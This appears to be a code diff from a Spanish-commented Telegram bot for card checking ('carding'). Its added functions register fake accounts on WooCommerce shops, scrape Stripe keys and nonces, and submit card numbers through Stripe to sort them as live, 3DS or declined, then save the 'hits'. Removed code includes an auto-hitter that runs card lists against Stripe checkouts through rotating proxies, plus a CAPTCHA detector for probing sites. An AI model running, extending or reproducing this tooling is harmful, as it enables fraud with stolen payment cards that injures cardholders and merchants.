+        'exp_year': year[-2:] if len(year) == 4 else year,
+        'cvc': cvv
+    }
+    
+    try:
+        base_url = normalize_url_stripe(site_url)
+        
+        timeout = aiohttp.ClientTimeout(total=70)
+        connector = aiohttp.TCPConnector(ssl=False)
+        
+        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+            from urllib.parse import urlparse
+            parsed = urlparse(base_url)
+            domain = f"{parsed.scheme}://{parsed.netloc}"
+            
+            email = generate_random_email()
+            
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'user-agent': ua.random,
+            }
+            
+            resp = await session.get(base_url, headers=headers)
+            resp_text = await resp.text()
+            
+            register_nonce = (
+                gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
+                gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
+                gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
+            )
+            
+            if register_nonce:
+                username = email.split('@')[0]
+                password = f"Pass{random.randint(100000, 999999)}!"
+                
+                register_data = {
+                    'email': email,
+                    'wc_order_attribution_source_type': 'typein',
+                    'wc_order_attribution_referrer': '(none)',
+                    'wc_order_attribution_utm_campaign': '(none)',
+                    'wc_order_attribution_utm_source': '(direct)',
+                    'wc_order_attribution_utm_medium': '(none)',
+                    'wc_order_attribution_utm_content': '(none)',
+                    'wc_order_attribution_utm_id': '(none)',
+                    'wc_order_attribution_utm_term': '(none)',
+                    'wc_order_attribution_utm_source_platform': '(none)',
+                    'wc_order_attribution_utm_creative_format': '(none)',
+                    'wc_order_attribution_utm_marketing_tactic': '(none)',
+                    'wc_order_attribution_session_entry': base_url,
+                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'wc_order_attribution_session_pages': '1',
+                    'wc_order_attribution_session_count': '1',
+                    'wc_order_attribution_user_agent': headers['user-agent'],
+                    'woocommerce-register-nonce': register_nonce,
+                    '_wp_http_referer': '/my-account/',
+                    'register': 'Register',
+                }
+                
+                await session.post(base_url, headers=headers, data=register_data)
+            
+            add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
+            if '/my-account/add-payment-method' not in add_payment_url:
+                add_payment_url = f"{domain}/my-account/add-payment-method/"
+            
+            headers = {'user-agent': ua.random}
+            resp = await session.get(add_payment_url, headers=headers)
+            payment_page_text = await resp.text()
+            
+            add_card_nonce = (
+                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
+                gets(payment_page_text, 'add_card_nonce":"', '"') or
+                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
+                gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
+            )
+            
+            stripe_key = (
+                gets(payment_page_text, '"key":"pk_', '"') or
+                gets(payment_page_text, 'data-key="pk_', '"') or
+                gets(payment_page_text, 'stripe_key":"pk_', '"') or
+                gets(payment_page_text, 'publishable_key":"pk_', '"')
+            )
+            
+            if not stripe_key:
+                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
+                if pk_match:
+                    stripe_key = pk_match.group(0)
+            
+            if not stripe_key:
+                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+            elif not stripe_key.startswith('pk_'):
+                stripe_key = 'pk_' + stripe_key
+            
+            stripe_headers = {
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': ua.random
+            }
+            
+            stripe_data = {
+                'type': 'card',
+                'card[number]': card_data['number'],
+                'card[cvc]': card_data['cvc'],
+                'card[exp_month]': card_data['exp_month'],
+                'card[exp_year]': card_data['exp_year'],
+                'allow_redisplay': 'unspecified',
+                'billing_details[address][country]': 'AU',
+                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
+                'referrer': domain,
+                'client_attribution_metadata[client_session_id]': generate_guid(),
+                'client_attribution_metadata[merchant_integration_source]': 'elements',
+                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                'client_attribution_metadata[merchant_integration_version]': '2021',
+                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
+                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+                'guid': generate_guid(),
+                'muid': generate_guid(),
+                'sid': generate_guid(),
+                'key': stripe_key,
+                '_stripe_version': '2024-06-20',
+            }
+            
+            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
+            pm_json = await pm_resp.json()
+            
+            if 'error' in pm_json:
+                error_msg = pm_json['error'].get('message', 'Unknown error')
+                error_code = pm_json['error'].get('code', 'unknown')
+                
+                if 'cvc' in error_msg.lower() or 'cvv' in error_msg.lower():
+                    return ("CVV", f"❌ CVV incorrecto", error_msg, "FREE", "STRIPE-AUTH")
+                elif 'insufficient' in error_msg.lower():
+                    return ("LIVE", f"⚠️ LIVE - Fondos insuficientes", error_msg, "FREE", "STRIPE-AUTH")
+                elif 'requiresaction' in error_msg.lower() or '3d' in error_msg.lower():
+                    return ("3DS", f"✅ 3DS Required - Tarjeta válida", error_msg, "FREE", "STRIPE-AUTH")
+                else:
+                    return ("DECLINED", f"❌ Declinado", error_msg, "FREE", "STRIPE-AUTH")
+            
+            pm_id = pm_json.get('id')
+            if not pm_id:
+                return ("ERROR", "❌ Failed to create Payment Method", str(pm_json), "FREE", "STRIPE-AUTH")
+            
+            confirm_headers = {
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': domain,
+                'x-requested-with': 'XMLHttpRequest',
+                'user-agent': ua.random
+            }
+            
+            endpoints = [
+                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
+                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
+                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
+            ]
+            
+            for endp in endpoints:
+                if not add_card_nonce:
+                    continue
+                
+                if 'add_payment_method' in endp['url']:
+                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
+                else:
+                    endp['data']['_ajax_nonce'] = add_card_nonce
+                
+                endp['data']['wc-stripe-payment-type'] = 'card'
+                
+                try:
+                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
+                    text = await res.text()
+                    
+                    if 'success' in text:
+                        js = json.loads(text)
+                        if js.get('success'):
+                            status = js.get('data', {}).get('status')
+                            response_parts = []
+                            if status:
+                                response_parts.append(f"Status: {status}")
+                            if js.get('data', {}).get('payment_method'):
+                                response_parts.append(f"PM: {js['data']['payment_method']}")
+                            
+                            full_response = " | ".join(response_parts) if response_parts else "succeeded"
+                            
+                            if status == 'succeeded':
+                                return ("LIVE", "✅ LIVE - Card added successfully", full_response, "FREE", "STRIPE-AUTH")
+                            elif status == 'requires_action' or status == 'requiresaction':
+                                return ("3DS", "✅ 3DS Required - Valid card", full_response, "FREE", "STRIPE-AUTH")
+                            return ("LIVE", f"✅ LIVE - Status: {status}", full_response, "FREE", "STRIPE-AUTH")
+                        else:
+                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
+                            error_code = js.get('data', {}).get('error', {}).get('code', 'unknown')
+                            if 'requiresaction' in error_msg.lower() or '3d' in error_msg.lower():
+                                return ("3DS", f"✅ 3DS Required", error_msg, "FREE", "STRIPE-AUTH")
+                            return ("DECLINED", f"❌ {error_msg}", error_msg, "FREE", "STRIPE-AUTH")
+                except:
+                    continue
+            
+            return ("ERROR", "❌ Failed to confirm payment method", pm_id, "FREE", "STRIPE-AUTH")
+            
+    except Exception as e:
+        return ("ERROR", f"❌ System Error: {str(e)}", str(e), "FREE", "STRIPE-AUTH")
+
+def check_stripe_auth(cc, month, year, cvv):
+    """Wrapper síncrono para Stripe Auth - TIEMPO REAL CORREGIDO"""
+    site_url = get_random_stripe_site()
+    start_time = time.time()  # Tiempo real desde el inicio de la función
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(check_stripe_auth_async(cc, month, year, cvv, site_url, start_time))
+        loop.close()
+        # Calcular tiempo real transcurrido
+        real_elapsed = time.time() - start_time
+        # Devolver el resultado con el tiempo real
+        return (result[0], result[1], result[2], result[3], result[4], round(real_elapsed, 2))
+    except Exception as e:
+        real_elapsed = time.time() - start_time
+        return ("ERROR", "Failed to check", str(e), "FREE", "STRIPE-AUTH", round(real_elapsed, 2))
+
+# ============================================
+# STRIPE AUTH CARD MANAGEMENT
+# ============================================
+
+def load_stripe_cards():
+    return safe_json_load(STRIPE_CARDS_FILE, [])
+
+def save_stripe_cards(cards):
+    return safe_json_save(STRIPE_CARDS_FILE, cards)
+
+def add_stripe_card(cc, month, year, cvv):
+    cards = load_stripe_cards()
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    if card_str not in cards:
+        cards.append(card_str)
+        save_stripe_cards(cards)
+        return True
+    return False
+
+def clear_stripe_cards():
+    save_stripe_cards([])
+
+def get_all_stripe_cards():
+    return load_stripe_cards()
+
+def delete_stripe_card(card_str):
+    cards = load_stripe_cards()
+    if card_str in cards:
+        cards.remove(card_str)
+        save_stripe_cards(cards)
+        return True
+    return False
+
+def load_stripe_hits():
+    return safe_json_load(STRIPE_HITS_FILE, [])
+
+def save_stripe_hit(hit_data):
+    hits = load_stripe_hits()
+    hits.append(hit_data)
+    safe_json_save(STRIPE_HITS_FILE, hits)
+    global stripe_hits_list
+    stripe_hits_list.append(hit_data)
+    try:
+        sqlite_backup.save_hit_backup(hit_data, "stripe_auth")
     except:
         pass
-    return "N/A"
 
-def create_progress_bar(current: int, total: int, width: int = 20) -> str:
-    if total == 0:
-        return "[" + "░" * width + "]"
-    filled = int((current / total) * width)
-    bar = "█" * filled + "░" * (width - filled)
-    return f"[{bar}]"
+def get_stripe_hits():
+    global stripe_hits_list
+    if not stripe_hits_list:
+        stripe_hits_list = load_stripe_hits()
+    return stripe_hits_list
 
-def escape_markdown(text: str) -> str:
-    """Escapa caracteres especiales para Markdown de Telegram"""
-    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
-    for char in special_chars:
-        text = text.replace(char, f'\\{char}')
-    return text
+# ============================================
+# STRIPE CHARGE GATEWAY
+# ============================================
 
-# ================== DETECCIÓN INTELIGENTE DE LÍNEAS ==================
-def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
-    """
-    Detecta si una línea es SITE, PROXY o CARD
-    Retorna: (tipo, línea_normalizada)
-    """
-    line = line.strip()
-    if not line:
-        return None, None
-
-    # 1️⃣ DETECCIÓN DE SITES (URLs)
-    if line.startswith(('http://', 'https://')):
-        # Es una URL completa
-        rest = line.split('://')[1]
-        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
-            return 'site', line
-    
-    # También puede ser dominio sin protocolo
-    if not line.startswith(('http://', 'https://')):
-        # Patrón de dominio válido
-        domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$'
-        if re.match(domain_pattern, line):
-            return 'site', f"https://{line}"
-
-    # 2️⃣ DETECCIÓN DE PROXIES
-    if not line.startswith(('http://', 'https://')):
-        parts = line.split(':')
-        
-        # Formato ip:port (2 partes)
-        if len(parts) == 2:
-            host, port = parts
-            if port.isdigit() and 1 <= int(port) <= 65535:
-                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
-                    return 'proxy', line
-        
-        # Formato ip:port:user:pass (4 partes)
-        elif len(parts) == 4:
-            host, port, user, password = parts
-            if port.isdigit() and 1 <= int(port) <= 65535:
-                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
-                    return 'proxy', line
-        
-        # Formato ip:port: (3 partes, último vacío)
-        elif len(parts) == 3 and parts[2] == '':
-            host, port, _ = parts
-            if port.isdigit() and 1 <= int(port) <= 65535:
-                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
-                    return 'proxy', f"{host}:{port}::"
-
-    # 3️⃣ DETECCIÓN DE TARJETAS
-    if '|' in line:
-        parts = line.split('|')
-        if len(parts) == 4:
-            numero, mes, año, cvv = parts
-            # Validación básica
-            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
-                mes.isdigit() and 1 <= int(mes) <= 12 and
-                año.isdigit() and len(año) in (2, 4) and
-                cvv.isdigit() and len(cvv) in (3, 4)):
-                return 'card', line
-
-    # 4️⃣ DETECCIÓN DE TARJETAS CON ESPACIOS
-    if ' ' in line and '|' not in line:
-        # Posible formato con espacios: 4377 1100 1030 9114|08|2026|501
-        parts = line.replace(' ', '').split('|')
-        if len(parts) == 4:
-            numero, mes, año, cvv = parts
-            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
-                mes.isdigit() and 1 <= int(mes) <= 12 and
-                año.isdigit() and len(año) in (2, 4) and
-                cvv.isdigit() and len(cvv) in (3, 4)):
-                return 'card', f"{numero}|{mes}|{año}|{cvv}"
-
-    return None, None
-
-# ================== STRIPE AUTO HITTER CON PROGRESO ==================
-class StripeAutoHitter:
-    """Bot de Auto Hit para Stripe con progreso en vivo y límite de intentos"""
-    
-    def __init__(self, proxies: List[str] = None, hit_limit: int = 0):
-        self.proxies = proxies if proxies else []
-        self.proxy_index = 0
-        self.results = []
-        self.hit_limit = hit_limit  # 0 = todas las tarjetas
-        self.stop_flag = False
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        ]
-        
-    def _get_next_proxy(self) -> Optional[str]:
-        """Obtiene el siguiente proxy en rotación"""
-        if not self.proxies:
-            return None
-        
-        proxy = self.proxies[self.proxy_index]
-        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
-        
-        # Formatear proxy para aiohttp
-        proxy_parts = proxy.split(':')
-        if len(proxy_parts) == 4:
-            return f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
-        elif len(proxy_parts) == 3 and proxy_parts[2] == '':
-            return f"http://{proxy_parts[0]}:{proxy_parts[1]}"
-        elif len(proxy_parts) == 2:
-            return f"http://{proxy}"
-        else:
-            return None
-    
-    def _get_random_user_agent(self) -> str:
-        return random.choice(self.user_agents)
-    
-    def _extract_session_id(self, url: str) -> Optional[str]:
-        """Extrae el session_id de una URL de Stripe Checkout"""
-        patterns = [
-            r'cs_live_[a-zA-Z0-9]+',
-            r'cs_test_[a-zA-Z0-9]+',
-            r'pi_[a-zA-Z0-9]+',
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, url)
-            if match:
-                return match.group(0)
-        
-        return None
-    
-    def _extract_amount_from_hash(self, url: str) -> Optional[float]:
-        """Intenta extraer el monto del hash de la URL"""
-        if '#' not in url:
-            return None
-        
-        hash_part = url.split('#')[-1]
-        try:
-            # Intentar decodificar base64
-            decoded = base64.b64decode(hash_part + '==').decode('utf-8', errors='ignore')
-            # Buscar patrones de monto
-            amount_match = re.search(r'amount["\']?:?\s*["\']?(\d+)', decoded)
-            if amount_match:
-                return int(amount_match.group(1)) / 100  # Stripe usa centavos
-        except:
-            pass
-        
-        return None
-    
-    async def _attempt_payment(self, session_id: str, card: Dict, proxy: Optional[str]) -> StripeHitResult:
-        """Intenta un pago individual con proxy"""
-        
-        start_time = time.time()
-        
-        # Headers como navegador real
+def sc_fetch_form_nonce(session):
+    """Get fresh GiveWP form hash via AJAX nonce reset"""
+    try:
         headers = {
-            'User-Agent': self._get_random_user_agent(),
-            'Accept': 'application/json',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://checkout.stripe.com',
-            'Referer': f'https://checkout.stripe.com/c/pay/{session_id}',
-            'DNT': '1',
-            'Connection': 'keep-alive',
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": SC_SITE_URL,
+            "Referer": SC_DONATION_PAGE,
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
         }
-        
-        # Datos de la tarjeta en formato Stripe
-        payment_data = {
-            'payment_method_data[type]': 'card',
-            'payment_method_data[card][number]': card['number'],
-            'payment_method_data[card][exp_month]': card['month'],
-            'payment_method_data[card][exp_year]': card['year'],
-            'payment_method_data[card][cvc]': card['cvv'],
-            'payment_method_data[billing_details][name]': f"User {random.randint(1000,9999)}",
-            'payment_method_data[billing_details][email]': f"user{random.randint(1000,9999)}@gmail.com",
-            'payment_intent': session_id,
+        data = {
+            "action": "give_donation_form_reset_all_nonce",
+            "give_form_id": SC_FORM_ID,
         }
-        
-        try:
-            connector = aiohttp.TCPConnector(ssl=False)
-            async with aiohttp.ClientSession(connector=connector) as session:
-                # Configurar proxy si existe
-                if proxy:
-                    async with session.post(
-                        'https://api.stripe.com/v1/payment_intents',
-                        data=payment_data,
-                        headers=headers,
-                        proxy=proxy,
-                        ssl=False,
-                        timeout=aiohttp.ClientTimeout(total=Settings.STRIPE_CARD_TIMEOUT)
-                    ) as resp:
-                        elapsed = time.time() - start_time
-                        result = await resp.json()
-                        return self._parse_stripe_response(result, resp.status, card, elapsed)
-                else:
-                    async with session.post(
-                        'https://api.stripe.com/v1/payment_intents',
-                        data=payment_data,
-                        headers=headers,
-                        ssl=False,
-                        timeout=aiohttp.ClientTimeout(total=Settings.STRIPE_CARD_TIMEOUT)
-                    ) as resp:
-                        elapsed = time.time() - start_time
-                        result = await resp.json()
-                        return self._parse_stripe_response(result, resp.status, card, elapsed)
-                    
-        except asyncio.TimeoutError:
-            elapsed = time.time() - start_time
-            return StripeHitResult(
-                card_last4=card['last4'],
-                bin=card['bin'],
-                status='TIMEOUT',
-                reason='connection_timeout',
-                response_time=elapsed
-            )
-        except Exception as e:
-            elapsed = time.time() - start_time
-            return StripeHitResult(
-                card_last4=card['last4'],
-                bin=card['bin'],
-                status='ERROR',
-                reason=str(e)[:50],
-                response_time=elapsed
-            )
-    
-    def _parse_stripe_response(self, response: Dict, http_code: int, card: Dict, elapsed: float) -> StripeHitResult:
-        """Interpreta la respuesta de Stripe - RESULTADOS REALES como en la captura"""
-        
-        # Si es 200 OK, pudo ser exitoso o requerir 3DS
-        if http_code == 200:
-            # Verificar si requiere 3DS
-            if response.get('next_action', {}).get('type') == 'use_stripe_sdk':
-                return StripeHitResult(
-                    card_last4=card['last4'],
-                    bin=card['bin'],
-                    status='3DS',
-                    reason='3DS Authentication Required',
-                    response_time=elapsed,
-                    three_ds=True
-                )
-            
-            # Pago exitoso
-            return StripeHitResult(
-                card_last4=card['last4'],
-                bin=card['bin'],
-                status='LIVE',
-                reason='payment_successful',
-                response_time=elapsed,
-                fraud_score='low'
-            )
-        
-        # Errores HTTP 402 (Payment Required) - Tarjeta declinada
-        elif http_code == 402:
-            error = response.get('error', {})
-            code = error.get('code', 'unknown')
-            message = error.get('message', 'Unknown error')
-            
-            # Mapeo de códigos de Stripe a los mensajes de la captura
-            decline_map = {
-                'card_declined': ('DECLINED', 'generic_decline'),
-                'insufficient_funds': ('INSUFFICIENT_FUNDS', 'insufficient_funds'),
-                'expired_card': ('DECLINED', 'expired_card'),
-                'incorrect_cvc': ('DECLINED', 'cvc_error'),
-                'processing_error': ('DECLINED', 'processing_error'),
-                'fraudulent': ('FRAUDULENT', 'fraudulent'),
-                'three_d_secure_required': ('3DS', '3DS Authentication Required'),
-                'generic_decline': ('DECLINED', 'generic_decline'),
-            }
-            
-            status, reason = decline_map.get(code, ('DECLINED', 'generic_decline'))
-            
-            # Detectar fraude específicamente
-            if code == 'fraudulent' or 'fraud' in message.lower():
-                status = 'FRAUDULENT'
-                reason = 'fraudulent'
-            
-            return StripeHitResult(
-                card_last4=card['last4'],
-                bin=card['bin'],
-                status=status,
-                reason=reason,
-                response_time=elapsed,
-                fraud_score='high' if status == 'FRAUDULENT' else None
-            )
-        
-        # Otros errores
-        else:
-            return StripeHitResult(
-                card_last4=card['last4'],
-                bin=card['bin'],
-                status='ERROR',
-                reason=f'http_{http_code}',
-                response_time=elapsed
-            )
-    
-    async def hit_checkout_with_progress(self, checkout_url: str, cards: List[Dict], 
-                                          progress_callback=None) -> List[StripeHitResult]:
-        """
-        Intenta pagar con todas las tarjetas y reporta progreso
-        progress_callback: función async que recibe (current, total, last_result)
-        hit_limit: 0 = todas, >0 = número máximo de intentos
-        """
-        results = []
-        total = len(cards)
-        
-        # Si hay límite, solo procesar ese número de tarjetas
-        if self.hit_limit > 0:
-            cards_to_process = cards[:self.hit_limit]
-            total = len(cards_to_process)
-            logger.info(f"🎯 Límite de intentos: {self.hit_limit} tarjetas")
-        else:
-            cards_to_process = cards
-        
-        session_id = self._extract_session_id(checkout_url)
-        if not session_id:
-            logger.error("No se pudo extraer session_id de la URL")
-            return []
-        
-        estimated_amount = self._extract_amount_from_hash(checkout_url)
-        
-        for i, card in enumerate(cards_to_process):
-            # Verificar si debemos continuar (para poder detener)
-            if self.stop_flag:
-                logger.info("⏹ Proceso detenido por el usuario")
-                break
-            
-            proxy = self._get_next_proxy()
-            proxy_display = "sin proxy"
-            if proxy:
-                proxy_display = proxy.split('@')[0].replace('http://', '') if '@' in proxy else proxy
-            
-            logger.info(f"💳 [{i+1}/{total}] Probando tarjeta: {card['bin']}xxxxxx{card['last4']} con proxy {proxy_display}")
-            
-            # Intentar el pago con timeout
-            try:
-                result = await self._attempt_payment(session_id, card, proxy)
-                
-                # Si tenemos monto estimado, podemos usarlo para contexto
-                if estimated_amount:
-                    logger.info(f"💰 Monto estimado: ${estimated_amount:.2f}")
-                
-                results.append(result)
-                
-                # Llamar al callback de progreso si existe
-                if progress_callback:
-                    await progress_callback(i + 1, total, result)
-                
-                # Delay aleatorio entre intentos
-                delay = random.uniform(
-                    Settings.STRIPE_HIT_DELAY[0],
-                    Settings.STRIPE_HIT_DELAY[1]
-                )
-                await asyncio.sleep(delay)
-                
-            except Exception as e:
-                logger.error(f"❌ Error procesando tarjeta {i+1}: {e}")
-                result = StripeHitResult(
-                    card_last4=card['last4'],
-                    bin=card['bin'],
-                    status='ERROR',
-                    reason=str(e)[:50],
-                    response_time=0
-                )
-                results.append(result)
-                
-                if progress_callback:
-                    await progress_callback(i + 1, total, result)
-        
-        return results
-    
-    def stop(self):
-        """Detiene el proceso"""
-        self.stop_flag = True
+        r = session.post(SC_AJAX_URL, headers=headers, data=data, timeout=30, verify=False)
+        if r.status_code == 200:
+            resp = r.json()
+            if resp.get("success"):
+                return resp.get("data", {}).get("give_form_hash", "")
+    except:
+        pass
+    return ""
 
-# ================== NUEVO: CAPTCHA DETECTOR ==================
-class CaptchaDetector:
-    """Detecta si un sitio web tiene CAPTCHA y de qué tipo"""
+def sc_create_payment_method(card_number, exp_month, exp_year, cvc, name, email, addr):
+    """Create Stripe payment method via Elements API"""
+    session_id = str(uuid.uuid4())
+    time_on_page = random.randint(15000, 60000)
     
-    # Patrones de detección
-    CAPTCHA_PATTERNS = {
-        'recaptcha_v2': [
-            r'google\.com/recaptcha/api\.js',
-            r'g-recaptcha',
-            r'data-sitekey=',
-            r'recaptcha\.js',
-            r'recaptcha\/api\.js'
-        ],
-        'recaptcha_v3': [
-            r'recaptcha\/api\.js.*render=',
-            r'g-recaptcha.*v3',
-            r'recaptcha.*v3'
-        ],
-        'hcaptcha': [
-            r'hcaptcha\.com',
-            r'h-captcha',
-            r'js\.hcaptcha\.com',
-            r'hcaptcha.*sitekey'
-        ],
-        'cloudflare_turnstile': [
-            r'challenges\.cloudflare\.com',
-            r'turnstile',
-            r'cf-challenge'
-        ],
-        'geetest': [
-            r'geetest\.com',
-            r'gt\.geetest\.com',
-            r'geetest\.js'
-        ],
-        'funcaptcha': [
-            r'funcaptcha\.com',
-            r'arkoselabs\.com',
-            r'cdn\.arkoselabs\.com'
-        ],
-        'datadome': [
-            r'datadome\.co',
-            r'js\.datadome\.co',
-            r'geo\.datadome\.co'
-        ],
-        'aws_waf': [
-            r'aws-waf-captcha',
-            r'awswaf',
-            r'captcha\.aws'
-        ],
-        'generic': [
-            r'captcha',
-            r'challenge',
-            r'verify',
-            r'robot',
-            r'security.*check'
-        ]
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
     }
     
-    # Servicios de resolución de CAPTCHA (para referencia)
-    CAPTCHA_SERVICES = {
-        'recaptcha_v2': 'Google reCAPTCHA v2 (casilla/imágenes)',
-        'recaptcha_v3': 'Google reCAPTCHA v3 (invisible, basado en puntuación)',
-        'hcaptcha': 'hCaptcha (alternativa a reCAPTCHA)',
-        'cloudflare_turnstile': 'Cloudflare Turnstile',
-        'geetest': 'GeeTest (deslizador/rompecabezas)',
-        'funcaptcha': 'FunCaptcha (Arkoselabs)',
-        'datadome': 'DataDome (protección avanzada)',
-        'aws_waf': 'AWS WAF Captcha',
-        'generic': 'CAPTCHA genérico'
+    data = {
+        "type": "card",
+        "billing_details[name]": name,
+        "billing_details[email]": email,
+        "billing_details[address][line1]": addr["line1"],
+        "billing_details[address][line2]": "",
+        "billing_details[address][city]": addr["city"],
+        "billing_details[address][state]": addr["state"],
+        "billing_details[address][postal_code]": addr["zip"],
+        "billing_details[address][country]": "US",
+        "card[number]": card_number,
+        "card[cvc]": cvc,
+        "card[exp_month]": exp_month,
+        "card[exp_year]": exp_year,
+        "guid": "NA",
+        "muid": "NA",
+        "sid": "NA",
+        "payment_user_agent": "stripe.js/332636417d; stripe-js-v3/332636417d; card-element",
+        "referrer": SC_SITE_URL,
+        "time_on_page": str(time_on_page),
+        "client_attribution_metadata[client_session_id]": session_id,
+        "client_attribution_metadata[merchant_integration_source]": "elements",
+        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
+        "client_attribution_metadata[merchant_integration_version]": "2017",
+        "key": SC_STRIPE_PK,
+        "_stripe_account": SC_STRIPE_ACCT,
     }
-    
-    @staticmethod
-    async def detect_from_html(url: str, html: str) -> Dict:
-        """Detecta CAPTCHA analizando el HTML de la página"""
-        results = {
-            'url': url,
-            'has_captcha': False,
-            'detected_types': [],
-            'details': {},
-            'sitekeys': {},
-            'confidence': 'LOW',
-            'timestamp': datetime.now().isoformat()
-        }
-        
-        html_lower = html.lower()
-        
-        # Buscar patrones
-        for captcha_type, patterns in CaptchaDetector.CAPTCHA_PATTERNS.items():
-            matches = []
-            for pattern in patterns:
-                found = re.findall(pattern, html_lower)
-                if found:
-                    matches.extend(found)
-                    # Intentar extraer sitekey
-                    sitekey_match = re.search(r'sitekey["\']?:\s*["\']([^"\']+)["\']', html_lower)
-                    if sitekey_match:
-                        results['sitekeys'][captcha_type] = sitekey_match.group(1)
-            
-            if matches:
-                results['has_captcha'] = True
-                results['detected_types'].append(captcha_type)
-                results['details'][captcha_type] = {
-                    'matches': len(matches),
-                    'service': CaptchaDetector.CAPTCHA_SERVICES.get(captcha_type, 'Desconocido')
-                }
-        
-        # Calcular confianza
-        if len(results['detected_types']) > 0:
-            if len(results['detected_types']) >= 2 or 'recaptcha_v2' in results['detected_types']:
-                results['confidence'] = 'HIGH'
-            elif len(results['detected_types']) == 1:
-                results['confidence'] = 'MEDIUM'
-        
-        return results
-    
-    @staticmethod
-    async def analyze_headers(headers: Dict) -> Dict:
-        """Analiza headers HTTP en busca de indicadores de seguridad"""
-        indicators = {
-            'has_security_headers': False,
-            'server': headers.get('Server', 'Desconocido'),
-            'cf_ray': 'cf-ray' in headers,
-            'cloudflare': 'cloudflare' in headers.get('Server', '').lower(),
-            'datadome': 'datadome' in str(headers).lower(),
-            'akamai': 'akamai' in headers.get('Server', '').lower()
-        }
-        
-        indicators['has_security_headers'] = any([
-            indicators['cf_ray'],
-            indicators['cloudflare'],
-            indicators['datadome'],
-            indicators['akamai']
-        ])
-        
-        return indicators
-    
-    @staticmethod
-    async def check_site(url: str, timeout: int = 15) -> Dict:
-        """Analiza un sitio web completo para detectar CAPTCHA"""
-        logger.info(f"🔍 Analizando sitio: {url}")
-        
-        # Normalizar URL
